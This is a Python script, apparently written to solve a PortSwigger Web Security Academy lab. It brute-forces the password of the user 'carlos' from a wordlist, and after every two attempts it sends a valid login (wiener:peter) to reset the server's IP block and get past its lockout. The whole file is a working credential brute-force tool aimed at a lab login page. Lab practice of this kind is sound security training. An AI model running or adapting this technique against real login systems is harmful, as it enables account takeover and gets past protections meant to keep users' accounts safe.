# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

# Basic Logic Used In Program:
# Enumerate Passwords For Target Username
# If Password Found, Return Password
# Else If Password Not Found, Keep Enumerating
# Every Two Requests Make A Successfull Login With Valid Credentials To Avoid IP Block
# Success Is Measured By The Presence Of The 302 Status Code

import sys
import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
VALID_USERNAME = "wiener"
VALID_PASSWORD = "peter"
TARGET_USERNAME = "carlos"
REQUESTS_BEFORE_BLOCK = 2
SUCCESS_STAUS_CODE = 302

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def send_http_post(username, password):
    data = {"username": username, "password": password}
    response = requests.post(FULL_PATH, data = data, allow_redirects = False)
    print(f"{username}:{password} --> {response.status_code}")
    return response

def find_password(username, passwords):
    request_number = 1
    for password in passwords:
        if request_number == REQUESTS_BEFORE_BLOCK:
            print(f"Resetting IP Block...")
            send_http_post(VALID_USERNAME, VALID_PASSWORD)
            request_number = 0
        response = send_http_post(username, password)
        if response.status_code == SUCCESS_STAUS_CODE:
            return password
        request_number += 1
    return None

def main():
    print(f"Program Starting... Target URL: {FULL_PATH}")
    passwords = load_file_lines(PASSWORD_FILE)
    if passwords is None:
        print(f"Something went wrong trying to load file: {PASSWORD_FILE}")
        sys.exit(1)
    password = find_password(TARGET_USERNAME, passwords)
    if password:
        print(f"Possible password found for {TARGET_USERNAME}: {password}")
        return 0

    print("Something Went Wrong...")
    return 1

if __name__ == "__main__":
    main()
